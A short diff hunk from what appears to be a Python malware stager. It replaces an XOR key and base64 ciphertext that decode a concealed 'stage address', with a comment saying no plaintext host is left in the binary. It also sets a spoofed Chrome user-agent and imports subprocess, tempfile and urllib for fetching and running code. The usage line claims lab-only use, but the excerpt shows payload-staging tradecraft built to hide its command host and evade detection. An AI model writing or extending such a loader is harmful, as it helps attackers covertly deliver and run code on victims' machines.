@@ -5,8 +5,8 @@ Usage: drop on a lab box you own; it self-targets via the pinned channel.
 import os, sys, base64, zlib, subprocess, tempfile, urllib.request, ssl
 
 # sealed stage address (XOR+base64, no plaintext host in the binary)
-_K = base64.b64decode("N1Y/F3NO2HODhpfFOcL2Zw==")
-_C = base64.b64decode("XyJLZwB091zx5/qqSrGCAlY6WmVdKq0Q6OL5thethAA=")
+_K = base64.b64decode("w0Ud5cS4y3DXm7+hxLAapQ==")
+_C = base64.b64decode("qzFplbeC5F+h9NbFp55+0KAueYu3lqQCsA==")
 STAGE = bytes(b ^ _K[i % len(_K)] for i, b in enumerate(_C)).decode()
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36"
